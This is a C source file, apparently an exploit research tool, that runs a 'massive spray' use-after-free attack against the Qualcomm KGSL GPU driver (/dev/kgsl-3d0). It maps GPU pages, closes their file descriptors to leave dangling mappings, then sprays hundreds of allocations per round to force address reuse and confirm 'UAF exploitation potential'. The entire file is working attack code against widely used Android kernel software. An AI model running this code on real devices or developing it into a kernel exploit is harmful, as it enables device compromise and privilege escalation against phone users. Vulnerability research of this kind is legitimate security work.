/*
 * KGSL Massive Spray - Force GPU Address Reuse
 * =============================================
 *
 * 策略：
 * 1. 大量分配/釋放循環
 * 2. 保留 dangling mmap
 * 3. 等待地址重用
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/time.h>

#define IOCTL_KGSL_GPUMEM_ALLOC 0xc018092f

struct kgsl_gpumem_alloc
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t padding;
};

static sigjmp_buf jmp_env;
static volatile sig_atomic_t sig_received = 0;

void sig_handler(int sig)
{
    sig_received = sig;
    siglongjmp(jmp_env, 1);
}

typedef struct
{
    int fd;
    uint64_t gpuaddr;
    void *map;
} victim_t;

#define MAX_VICTIMS 100
victim_t victims[MAX_VICTIMS];
int victim_count = 0;

void create_victim(void)
{
    if (victim_count >= MAX_VICTIMS)
        return;

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
        return;

    struct kgsl_gpumem_alloc alloc = {0};
    alloc.size = 0x1000;

    if (ioctl(fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0)
    {
        close(fd);
        return;
    }

    uint64_t page_idx = (alloc.gpuaddr - 0x4000000000ULL) / 0x1000;
    uint64_t offset = (page_idx + 1) * 0x1000;

    void *map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset);
    if (map == MAP_FAILED)
    {
        close(fd);
        return;
    }

    // Write unique marker
    *(uint64_t *)map = 0xBBBB000000000000ULL | victim_count;

    victims[victim_count].fd = fd;
    victims[victim_count].gpuaddr = alloc.gpuaddr;
    victims[victim_count].map = map;
    victim_count++;
}

void close_victim_fd(int idx)
{
    if (idx >= victim_count)
        return;
    if (victims[idx].fd >= 0)
    {
        close(victims[idx].fd);
        victims[idx].fd = -1;
    }
}

int check_victim_reuse(int idx, int spray_fd)
{
    if (idx >= victim_count)
        return 0;
    if (victims[idx].fd >= 0)
        return 0; // Still open, can't be reused

    // Check if we can still access the memory
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        uint64_t val = *(volatile uint64_t *)victims[idx].map;
        uint64_t expected = 0xBBBB000000000000ULL | idx;

        if (val != expected)
        {
            printf("[!!!] VICTIM %d CORRUPTED! Expected 0x%lx, got 0x%lx\n",
                   idx, expected, val);
            return 1;
        }
    }
    return 0;
}

int main(int argc, char **argv)
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL Massive Spray Attack                                     ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    // Phase 1: Create victims
    printf("[*] Phase 1: Creating %d victims...\n", MAX_VICTIMS);
    for (int i = 0; i < MAX_VICTIMS; i++)
    {
        create_victim();
    }
    printf("[+] Created %d victims\n", victim_count);

    // Print victim addresses
    printf("[*] Victim GPU addresses:\n");
    for (int i = 0; i < victim_count && i < 10; i++)
    {
        printf("    [%02d] 0x%lx\n", i, victims[i].gpuaddr);
    }
    if (victim_count > 10)
    {
        printf("    ... (%d more)\n", victim_count - 10);
    }

    // Phase 2: Close victim FDs (but keep maps)
    printf("\n[*] Phase 2: Closing victim FDs (creating dangling maps)...\n");
    for (int i = 0; i < victim_count; i++)
    {
        close_victim_fd(i);
    }
    printf("[+] All victim FDs closed, maps are now dangling\n");

    // Phase 3: Massive spray
    printf("\n[*] Phase 3: Massive spray (10 rounds)...\n");

    int total_sprays = 0;
    int reuse_detected = 0;

    for (int round = 0; round < 10 && !reuse_detected; round++)
    {
        printf("[*] Round %d: ", round + 1);
        fflush(stdout);

        int spray_fd = open("/dev/kgsl-3d0", O_RDWR);
        if (spray_fd < 0)
        {
            printf("Cannot open KGSL\n");
            break;
        }

        // Spray allocations
        for (int i = 0; i < 500; i++)
        {
            struct kgsl_gpumem_alloc alloc = {0};
            alloc.size = 0x1000;

            if (ioctl(spray_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0)
            {
                continue;
            }
            total_sprays++;

            // Map and write attacker pattern
            uint64_t page_idx = (alloc.gpuaddr - 0x4000000000ULL) / 0x1000;
            uint64_t offset = (page_idx + 1) * 0x1000;

            void *map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, spray_fd, offset);
            if (map != MAP_FAILED)
            {
                *(uint64_t *)map = 0xAAAA000000000000ULL | (round * 500 + i);
                munmap(map, 0x1000);
            }

            // Check if any victim is corrupted
            for (int v = 0; v < victim_count; v++)
            {
                if (check_victim_reuse(v, spray_fd))
                {
                    printf("\n[!!!] REUSE DETECTED after %d sprays!\n", total_sprays);
                    printf("[!!!] Victim %d was overwritten by spray\n", v);
                    printf("[!!!] This confirms UAF exploitation potential!\n");
                    reuse_detected = 1;
                    break;
                }
            }
        }

        printf("%d sprays\n", total_sprays);
        close(spray_fd);

        // Small delay to let allocator reclaim
        usleep(50000);
    }

    if (!reuse_detected)
    {
        printf("\n[*] No reuse detected after %d sprays\n", total_sprays);
        printf("[*] Checking victim integrity...\n");

        int corrupted = 0;
        for (int i = 0; i < victim_count; i++)
        {
            sig_received = 0;
            if (sigsetjmp(jmp_env, 1) == 0)
            {
                uint64_t val = *(volatile uint64_t *)victims[i].map;
                uint64_t expected = 0xBBBB000000000000ULL | i;

                if (val != expected)
                {
                    printf("    [%02d] CORRUPTED: expected 0x%lx, got 0x%lx\n",
                           i, expected, val);
                    corrupted++;
                }
            }
            else
            {
                printf("    [%02d] SIGNAL %d on access\n", i, sig_received);
                corrupted++;
            }
        }

        if (corrupted == 0)
        {
            printf("[+] All %d victims intact\n", victim_count);
        }
        else
        {
            printf("[!] %d victims corrupted!\n", corrupted);
        }
    }

    // Cleanup
    printf("\n[*] Cleanup...\n");
    for (int i = 0; i < victim_count; i++)
    {
        if (victims[i].map)
        {
            munmap(victims[i].map, 0x1000);
        }
    }

    printf("\n=== Attack Complete ===\n");
    return 0;
}
